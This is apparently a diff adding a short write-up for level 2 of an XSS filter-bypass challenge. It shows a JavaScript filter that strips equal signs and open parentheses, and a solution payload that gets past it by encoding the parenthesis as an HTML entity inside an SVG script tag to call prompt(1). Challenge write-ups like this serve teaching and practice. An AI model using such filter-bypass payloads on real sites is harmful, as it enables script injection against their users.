@@ -1,0 +1,16 @@
+Level 2
+
+
+function escape(input) {
+    //                      v-- frowny face
+    input = input.replace(/[=(]/g, '');
+
+    // ok seriously, disallows equal signs and open parenthesis
+    return input;
+}
+
+Solution:-
+
+Given that, It disallows equal sign and open parenthesis so i have used encoding number for "(" i.e. "&#40"
+
+Use the following script:-    <svg><script><prompt&#40;1)</script>
